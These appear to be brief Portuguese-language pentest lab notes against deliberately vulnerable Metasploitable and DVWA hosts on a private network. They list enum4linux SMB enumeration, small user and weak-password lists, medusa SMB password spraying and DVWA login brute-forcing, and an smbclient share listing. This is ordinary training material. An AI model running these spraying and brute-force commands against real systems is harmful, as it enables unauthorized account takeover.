enum4linux -a (ip da máquina MSF) | tee enum4.output.txt
less enum4.output.txt
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
echo -e 'password\n123456\nWelcome\nmsfadmin' > senhas_spray.txt 

medusa -h (ip da máquina MSF) -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

medusa -h 192.168.56.102 -U user.txt -P pass.txt -M http
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

smbclient -L //192.168.56.101 -U msfadmin

